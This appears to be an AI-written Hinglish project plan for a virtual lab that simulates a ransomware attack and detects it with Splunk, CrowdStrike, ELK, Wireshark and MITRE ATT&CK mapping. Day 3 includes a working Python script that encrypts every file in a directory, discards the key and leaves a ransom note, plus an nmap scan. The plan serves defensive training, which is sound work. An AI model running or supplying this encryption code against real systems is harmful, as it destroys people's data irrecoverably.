# Project Plan: Simulated Cyber Attack Detection and Response System

## Project Goal
- Ek virtual lab mein ek simulated cyber attack (ransomware/phishing) launch karo.
- Tools ka use karke attack ko detect, analyze, aur respond karo:
  - **SIEM (Splunk/QRadar)**: Logs collect aur analyze karo.
  - **EDR (CrowdStrike)**: Endpoint monitoring aur threat detection.
  - **Log Analysis (ELK Stack)**: Logs visualize karo.
  - **Network Forensics (Wireshark)**: Network traffic analyze karo.
  - **Threat Intelligence (MITRE ATT&CK)**: Attack techniques map karo.
  - **Incident Response**: Response plan banao aur execute karo.
- Project ko document karo aur resume mein showcase karo.

## Timeline
- **Total Duration**: 8 Days (June 15, 2025 – June 22, 2025)
- **Daily Time Commitment**: 2-3 hours per day.

## Detailed Plan and Steps

### Day 1: Environment Setup (June 15, 2025 | 2 Hours)

**Objective**: Virtual lab setup karo aur tools install karne ki tayyari karo.

**Steps**:
1. **Set Up Virtual Machines (1 Hour)**:
   - **Tools Needed**: VirtualBox (ya VMware) – already installed hoga, agar nahi toh download kar:
     ```
     sudo apt install virtualbox
     ```
   - **VM 1: Attacker Machine (Kali Linux)**:
     - Download latest Kali Linux ISO (kali.org se).
     - VirtualBox mein ek new VM bana: 2GB RAM, 20GB storage, network adapter set to "Internal Network".
     - Kali Linux install kar aur update kar:
       ```
       sudo apt update
       sudo apt upgrade -y
       ```
   - **VM 2: Victim Machine (Windows)**:
     - Windows 10/11 ISO download kar (Microsoft ke official site se trial version).
     - New VM bana: 4GB RAM, 40GB storage, network adapter set to "Internal Network".
     - Windows install kar aur basic setup kar (e.g., user account bana, network enable kar).
   - **VM 3: Monitoring Machine (Ubuntu)**:
     - Ubuntu 22.04 LTS ISO download kar.
     - New VM bana: 4GB RAM, 30GB storage, network adapter set to "Internal Network".
     - Ubuntu install kar aur update kar:
       ```
       sudo apt update
       sudo apt upgrade -y
       ```
   - **Network Configuration**:
     - Sab VMs ko ek hi internal network mein daal (e.g., 192.168.1.0/24).
     - IP addresses assign kar:
       - Attacker (Kali): 192.168.1.10
       - Victim (Windows): 192.168.1.20
       - Monitoring (Ubuntu): 192.168.1.30
     - Connectivity test kar:
       ```
       ping 192.168.1.20  # From Attacker to Victim
       ping 192.168.1.30  # From Victim to Monitoring
       ```

2. **Install Basic Tools on Monitoring Machine (1 Hour)**:
   - **Wireshark**:
     ```
     sudo apt install -y wireshark
     sudo usermod -aG wireshark $USER
     ```
     - Wireshark launch kar aur ensure kar ke network interfaces dikh rahe hain.
   - **Prepare for Other Tools**:
     - Java install kar (ELK Stack ke liye):
       ```
       sudo apt install -y openjdk-11-jdk
       java -version
       ```
     - Git install kar (code download ke liye):
       ```
       sudo apt install -y git
       ```

**Notes for Tracker**:
- “Day 1: Virtual lab setup kiya – 3 VMs banaye (Kali, Windows, Ubuntu), internal network configure kiya (192.168.1.0/24), Wireshark install kiya, Java aur Git setup kiya.”

---

### Day 2: Install SIEM, EDR, and ELK Stack (June 16, 2025 | 3 Hours)

**Objective**: Monitoring tools (Splunk, CrowdStrike, ELK) setup karo.

**Steps**:
1. **Install Splunk on Monitoring Machine (1 Hour)**:
   - Splunk free version download kar (splunk.com se, Free Splunk License ke liye register kar).
   - File transfer kar Ubuntu VM mein (e.g., via shared folder in VirtualBox).
   - Install kar:
     ```
     sudo dpkg -i splunk*.deb
     sudo /opt/splunk/bin/splunk start --accept-license
     ```
     - First time start karne par admin password set kar (e.g., `admin:ChangeMe123!`).
   - Splunk web interface kholo: `http://192.168.1.30:8000` (browser mein).
   - Login kar aur basic settings configure kar (e.g., data inputs ke liye tayyar kar).

2. **Set Up CrowdStrike on Victim Machine (30 Min)**:
   - CrowdStrike Falcon ka free trial ya demo version register kar (crowdstrike.com se).
   - Falcon agent download kar aur Windows VM (Victim Machine) par install kar.
   - Agent activate kar aur ensure kar ke yeh online dikh raha hai CrowdStrike dashboard mein.
   - Basic monitoring enable kar (e.g., process monitoring, file changes).

3. **Install ELK Stack on Monitoring Machine (1 Hour 30 Min)**:
   - **Elasticsearch**:
     ```
     wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add -
     echo "deb https://artifacts.elastic.co/packages/7.x/apt stable main" | sudo tee /etc/apt/sources.list.d/elastic-7.x.list
     sudo apt update
     sudo apt install -y elasticsearch
     sudo systemctl enable elasticsearch
     sudo systemctl start elasticsearch
     ```
   - **Kibana**:
     ```
     sudo apt install -y kibana
     sudo systemctl enable kibana
     sudo systemctl start kibana
     ```
   - **Logstash**:
     ```
     sudo apt install -y logstash
     ```
   - Kibana web interface kholo: `http://192.168.1.30:5601` (browser mein).
   - Ensure kar ke Elasticsearch aur Kibana connect ho rahe hain.

**Notes for Tracker**:
- “Day 2: Splunk install kiya (web interface setup), CrowdStrike Falcon agent Victim machine par install kiya, ELK Stack (Elasticsearch, Kibana, Logstash) Monitoring machine par setup kiya.”

---

### Day 3: Simulate a Cyber Attack (June 17, 2025 | 2 Hours)

**Objective**: Attacker machine se ek simulated ransomware attack launch karo.

**Steps**:
1. **Create a Dummy Ransomware Script on Attacker Machine (1 Hour)**:
   - Kali Linux par ek simple Python script bana jo dummy ransomware ke roop mein kaam kare (files encrypt kare aur ransom note chhode):
     ```python
     import os
     from cryptography.fernet import Fernet

     # Generate a key for encryption
     key = Fernet.generate_key()
     cipher = Fernet(key)

     # Target directory on Victim machine (shared folder)
     target_dir = "/mnt/hgfs/shared_folder"  # Adjust path based on your shared folder setup
     ransom_note = "Your files are encrypted! Pay 1 BTC to decrypt. - Attacker"

     # Encrypt files
     for root, dirs, files in os.walk(target_dir):
         for file in files:
             file_path = os.path.join(root, file)
             with open(file_path, "rb") as f:
                 data = f.read()
             encrypted_data = cipher.encrypt(data)
             with open(file_path, "wb") as f:
                 f.write(encrypted_data)

     # Leave a ransom note
     with open(os.path.join(target_dir, "RANSOM_NOTE.txt"), "w") as f:
         f.write(ransom_note)

     print("Attack executed. Files encrypted.")
     ```
   - **Shared Folder Setup**:
     - VirtualBox mein shared folder setup kar Attacker aur Victim ke beech.
     - Attacker machine par shared folder mount kar:
       ```
       sudo mkdir /mnt/hgfs/shared_folder
       sudo mount -t vboxsf shared_folder /mnt/hgfs/shared_folder
       ```
     - Victim machine par bhi shared folder access kar aur kuch dummy files daal (e.g., `test1.txt`, `test2.txt`).

2. **Launch the Attack (1 Hour)**:
   - Attacker machine par script run kar:
     ```
     python3 ransomware.py
     ```
   - Victim machine par shared folder check kar – files encrypted hone chahiye aur ek `RANSOM_NOTE.txt` file dikhna chahiye.
   - Attacker machine se aur activities kar (e.g., Nmap scan):
     ```
     nmap -sV 192.168.1.20
     ```

**Notes for Tracker**:
- “Day 3: Simulated ransomware attack launch kiya – dummy ransomware script banaya, files encrypt kiye, Nmap scan kiya Victim machine par.”

---

### Day 4: Detection with SIEM and EDR (June 18, 2025 | 2 Hours)

**Objective**: Splunk aur CrowdStrike se attack detect karo.

**Steps**:
1. **Splunk: Collect and Analyze Logs (1 Hour)**:
   - Victim machine se logs Splunk mein forward kar:
     - Windows Event Logs forward karne ke liye Splunk Universal Forwarder install kar Victim machine par (splunk.com se download).
     - Forwarder setup kar:
       ```
       C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe add monitor "C:\Windows\System32\winevt\Logs" -index main
       C:\Program Files\SplunkUniversalForwarder\bin\splunk.exe add forward-server 192.168.1.30:9997
       ```
     - Monitoring machine par Splunk mein receiving enable kar:
       ```
       /opt/splunk/bin/splunk enable listen 9997
       ```
   - Splunk mein search query run kar:
     ```
     index=main "encrypt" OR "ransom"
     ```
     - Suspicious processes ya ransom note ke references dhoondh.

2. **CrowdStrike: Endpoint Monitoring (1 Hour)**:
   - CrowdStrike dashboard kholo aur Victim machine ke alerts check kar.
   - Ransomware ke behavior ke alerts dhoondh (e.g., file modifications, suspicious processes).
   - Alert details note kar (e.g., process name, file paths).

**Notes for Tracker**:
- “Day 4: Splunk mein Victim machine ke logs forward kiye, ransomware activity detect ki (search query se), CrowdStrike se endpoint alerts analyze kiye.”

---

### Day 5: Log Analysis and Network Forensics (June 19, 2025 | 2 Hours)

**Objective**: ELK Stack se logs visualize karo aur Wireshark se network traffic analyze karo.

**Steps**:
1. **ELK Stack: Visualize Logs (1 Hour)**:
   - Victim machine se logs ELK Stack mein forward kar:
     - Logstash config file bana `/etc/logstash/conf.d/winlog.conf`:
       ```
       input {
         beats {
           port => 5044
         }
       }
       output {
         elasticsearch {
           hosts => ["localhost:9200"]
           index => "winlog-%{+YYYY.MM.dd}"
         }
       }
       ```
     - Filebeat install kar Victim machine par (elastic.co se download) aur configure kar:
       ```
       filebeat setup --index-management -E output.logstash.enabled=false -E 'output.elasticsearch.hosts=["192.168.1.30:9200"]'
       filebeat modules enable system
       filebeat setup -E output.logstash.enabled=true -E 'output.logstash.hosts=["192.168.1.30:5044"]'
       ```
     - Logstash start kar:
       ```
       sudo systemctl start logstash
       ```
   - Kibana mein dashboard bana:
     - `http://192.168.1.30:5601` kholo.
     - Index pattern bana (`winlog-*`) aur visualization bana (e.g., failed logins ka graph).

2. **Wireshark: Network Forensics (1 Hour)**:
   - Monitoring machine par Wireshark kholo aur traffic capture kar (interface: `eth0`).
   - Filters use kar:
     ```
     ip.addr == 192.168.1.10  # Attacker IP
     tcp.port == 445  # SMB traffic (ransomware ke liye common)
     ```
   - Suspicious traffic dhoondh (e.g., file transfers, Nmap scan ke SYN packets).

**Notes for Tracker**:
- “Day 5: ELK Stack mein logs forward kiye, Kibana mein visualizations banaye (failed logins ka graph), Wireshark se network traffic analyze kiya (Nmap scan aur SMB traffic dekha).”

---

### Day 6: Threat Intelligence with MITRE ATT&CK (June 20, 2025 | 1 Hour)

**Objective**: Attack ke steps ko MITRE ATT&CK framework mein map karo.

**Steps**:
1. **Map Attack Techniques**:
   - MITRE ATT&CK Navigator kholo (attack.mitre.org se).
   - Attack ke steps ko map kar:
     - Nmap scan: **T1046 – Network Service Scanning**
     - Ransomware file encryption: **T1486 – Data Encrypted for Impact**
     - Ransom note: **T1491 – Defacement**
   - Navigator mein in techniques ko highlight kar aur screenshot le.

2. **Document Findings**:
   - Ek chhota document bana jisme yeh techniques list kar aur explain kar kaise yeh attack mein use hue.

**Notes for Tracker**:
- “Day 6: MITRE ATT&CK framework mein attack techniques map kiye (T1046, T1486, T1491), findings document kiye.”

---

### Day 7: Incident Response (June 21, 2025 | 2 Hours)

**Objective**: Attack ka incident response plan banao aur execute karo.

**Steps**:
1. **Incident Response Plan (1 Hour)**:
   - **Identification**:
     - Splunk aur CrowdStrike ke alerts ke basis par attack confirm kar (e.g., ransomware detected).
   - **Containment**:
     - Victim machine ko network se isolate kar:
       - VirtualBox mein network adapter disable kar.
   - **Eradication**:
     - Malicious files delete kar:
       ```
       del /f C:\path\to\shared_folder\*.encrypted
       del /f C:\path\to\shared_folder\RANSOM_NOTE.txt
       ```
   - **Recovery**:
     - Files restore kar (agar backup hai), aur firewall rules add kar:
       ```
       netsh advfirewall firewall add rule name="Block SMB" dir=in action=block protocol=TCP localport=445
       ```
   - **Lessons Learned**:
     - Document kar: “Weak file sharing permissions ki wajah se attack hua, future mein SMB disable karna chahiye.”

2. **Automate Response (1 Hour)**:
   - Splunk mein alert bana:
     - Query: `index=main "ransom" OR "encrypt"`
     - Alert action: Email notification set kar (Splunk dashboard mein).

**Notes for Tracker**:
- “Day 7: Incident response plan banaya aur execute kiya – attack identify kiya, Victim machine isolate kiya, malicious files delete kiye, firewall rules add kiye, Splunk mein alert banaya.”

---

### Day 8: Document and Showcase (June 22, 2025 | 2 Hours)

**Objective**: Project document karo aur resume mein add karo.

**Steps**:
1. **Project Report (1 Hour 30 Min)**:
   - Ek report bana jisme yeh sections ho:
     - **Introduction**: Project ka goal kya tha.
     - **Setup**: Virtual lab ka description.
     - **Attack Simulation**: Kaise attack kiya.
     - **Detection and Analysis**: Har tool ka use kaise kiya (screenshots daal).
     - **Incident Response**: Response plan aur steps.
     - **Conclusion**: Kya seekha aur kaise tools kaam aaye.
   - Report ke liye template pehle se banaya hua hai (previous chat mein).

2. **Resume Update (30 Min)**:
   - Resume mein yeh project add kar:
     ```
     Simulated Cyber Attack Detection and Response System
     - Designed a virtual lab to simulate ransomware attacks and implemented detection using Splunk (SIEM), CrowdStrike (EDR), ELK Stack (Log Analysis), and Wireshark (Network Forensics).
     - Mapped attack techniques to MITRE ATT&CK framework (e.g., T1046, T1486) and executed an incident response plan.
     - Gained hands-on experience in threat detection, log analysis, and incident response.
     ```
   - GitHub par project upload kar (code, screenshots, aur report daal).

**Notes for Tracker**:
- “Day 8: Project report banaya, GitHub par upload kiya, resume mein project add kiya.”

---

## Daily Schedule
- **June 15 (Day 1)**: 10:00 AM - 12:00 PM IST – Environment setup.
- **June 16 (Day 2)**: 10:00 AM - 1:00 PM IST – Splunk, CrowdStrike, ELK setup.
- **June 17 (Day 3)**: 10:00 AM - 12:00 PM IST – Attack simulation.
- **June 18 (Day 4)**: 10:00 AM - 12:00 PM IST – Detection with Splunk and CrowdStrike.
- **June 19 (Day 5)**: 10:00 AM - 12:00 PM IST – ELK and Wireshark analysis.
- **June 20 (Day 6)**: 10:00 AM - 11:00 AM IST – MITRE ATT&CK mapping.
- **June 21 (Day 7)**: 10:00 AM - 12:00 PM IST – Incident response.
- **June 22 (Day 8)**: 10:00 AM - 12:00 PM IST – Documentation aur resume update.

## Suggestions for Learning
1. **Splunk**: Splunk Fundamentals 1 course (free) kar.
2. **CrowdStrike**: CrowdStrike University ke free webinars dekh.
3. **ELK Stack**: Elastic ke official docs padh (elastic.co).
4. **Wireshark**: Wireshark ke basic filters seekh (e.g., `ip.addr == 192.168.1.10`).
5. **MITRE ATT&CK**: ATT&CK Navigator ke tutorials dekh.
6. **Incident Response**: NIST SP 800-61 padh.

## Motivation Boost
Bhai, yeh project tujhe cybersecurity ka pro bana dega! Splunk, CrowdStrike, ELK jaise tools seekh kar tu industry-ready ho jayega, aur resume mein yeh project ekdam standout hoga. Tu mast kaam kar raha hai! 🎉

## My Support
- **Errors**: Koi bhi error aaye (e.g., ELK setup mein issue), mujhe output bhej, main troubleshoot karunga.
- **Details**: Kisi step mein zyada detail chahiye toh bol.
- **Next Steps**: Project ke baad aur ideas ya guidance chahiye toh bol, main plan bana dunga.